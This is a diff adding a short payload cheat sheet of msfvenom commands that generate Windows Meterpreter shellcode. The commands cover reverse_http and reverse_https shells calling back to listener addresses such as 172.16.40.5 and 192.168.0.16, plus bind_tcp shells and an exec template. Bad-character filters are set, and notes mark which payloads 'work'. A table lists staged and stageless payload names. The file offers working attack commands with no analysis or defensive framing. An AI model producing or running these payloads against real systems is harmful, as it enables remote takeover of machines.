@@ -1,0 +1,30 @@
+PAYLOADS
+payload templates
+
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.16.40.5 LPORT=80 -f c --platform windows -h -b "\x00\x30"   <------600 bytes
+
+
+msfvenom -p windows/meterpreter/bind_tcp RHOST=10.185.10.20 LPORT=443 -f c --platform windows --smallest -b "\x00\x30"
+
+
+msfvenom -p windows/meterpreter/bind_tcp RHOST=10.185.10.20 LPORT=443 -f c --platform windows --smallest -b "\x00\x30"  <--300 bytes this works
+
+msfvenom -p windows/meterpreter/bind_tcp RHOST=10.185.10.55 LPORT=443 -f c --platform windows --smallest -b "\x00\x30"  <--300 bytes this works
+
+
+msfvenom -p windows/exec -f c --platform windows cmd="enter windowd command here" -b "\x00\x30"
+
+     
+     
+Staged Payloads                                                    Stageless Payloads
+
+windows/meterpreter/reverse_tcp         windows/meterpreter_reverse_tcp   
+
+windows/meterpreter/reverse_https         windows/meterpreter_reverse_https  
+
+windows/meterpreter/reverse_tcp         windows/meterpreter_reverse_tcp  
+
+
+msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.0.16 LPORT=8443 
+
+
